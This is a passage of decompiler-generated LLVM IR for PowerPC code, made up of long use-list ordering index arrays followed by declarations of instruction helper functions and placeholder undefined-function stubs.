461, 462, 463, 1190, 47, 1191, 281, 447, 448, 449, 450, 451, 452, 453, 48, 181, 464, 465, 466, 467, 282, 283, 284, 1369, 324, 1370, 253, 1371, 81, 88, 89, 96, 95, 49, 50, 1373, 285, 286, 287, 288, 1381, 1375, 1377, 1378, 1379, 469, 1380, 470, 290, 289, 468, 82, 1374, 1376, 51, 111, 224, 223, 23, 24, 817, 471, 1383, 291, 292, 293, 294, 1384, 1385, 295, 296, 472, 83, 1386, 112, 90, 1391, 225, 182, 1392, 297, 1387, 1388, 473, 474, 475, 1389, 325, 477, 1393, 299, 298, 476, 84, 478, 1394, 300, 1405, 240, 481, 1406, 303, 480, 85, 1407, 302, 479, 226, 301, 52, 183, 1408, 304, 484, 485, 486, 1414, 487, 1413, 489, 490, 488, 1420, 1421, 326, 1422, 1423, 113, 53, 327, 1425, 227, 1427, 491, 492, 493, 305, 1428, 1429, 306, 494, 1435, 1436, 495, 1437, 1438, 1439, 496, 114, 309, 307, 308, 497, 498, 1478, 115, 54, 241, 228, 312, 313, 1467, 1468, 1469, 1470, 229, 310, 311, 314, 1471, 1472, 1473, 231, 55, 116, 117, 230, 1475, 1476, 1477, 328, 118, 56, 1474, 1482, 1483, 315, 1559, 1560, 1561, 1484, 820, 821, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585 }
  uselistorder i32* @lr, { 12, 371, 372, 373, 374, 375, 376, 213, 624, 625, 626, 377, 381, 378, 379, 380, 385, 386, 382, 383, 384, 387, 388, 389, 390, 391, 13, 14, 15, 18, 16, 17, 392, 395, 393, 1, 394, 0, 396, 399, 400, 397, 398, 401, 402, 403, 404, 405, 406, 407, 408, 315, 214, 215, 409, 410, 411, 412, 216, 217, 218, 219, 601, 631, 632, 633, 634, 627, 628, 629, 630, 413, 418, 433, 419, 420, 421, 434, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 564, 316, 317, 318, 319, 220, 221, 222, 635, 223, 224, 422, 423, 428, 429, 430, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 636, 637, 237, 238, 602, 603, 646, 647, 651, 652, 653, 654, 655, 668, 670, 672, 648, 650, 332, 288, 289, 290, 291, 292, 293, 294, 638, 644, 645, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 311, 19, 20, 363, 22, 364, 21, 23, 604, 606, 605, 24, 25, 26, 27, 28, 29, 607, 608, 609, 610, 611, 612, 310, 575, 474, 475, 333, 613, 539, 515, 84, 516, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 489, 490, 491, 492, 565, 537, 656, 657, 658, 659, 660, 663, 664, 665, 528, 239, 240, 241, 550, 551, 552, 553, 242, 487, 488, 554, 671, 669, 243, 244, 245, 431, 424, 426, 427, 425, 30, 432, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 10, 11, 260, 639, 640, 641, 642, 643, 666, 667, 435, 436, 437, 438, 439, 440, 441, 442, 274, 275, 276, 414, 415, 416, 417, 567, 31, 584, 32, 33, 34, 35, 649, 585, 661, 662, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 72, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 202, 198, 199, 200, 201, 2, 203, 204, 208, 205, 206, 207, 3, 209, 210, 211, 212, 279, 277, 278, 4, 280, 281, 282, 283, 284, 285, 286, 287, 312, 313, 314, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 5, 6, 7, 8, 9, 365, 366, 367, 368, 369, 370, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 529, 530, 531, 512, 513, 514, 517, 518, 519, 520, 521, 522, 523, 532, 524, 525, 526, 527, 533, 534, 535, 536, 538, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 555, 556, 557, 558, 559, 560, 561, 562, 563, 566, 568, 569, 570, 571, 572, 573, 574, 576, 577, 578, 579, 580, 581, 582, 583, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 614, 615, 616, 617, 618, 619, 621, 620, 622, 623 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
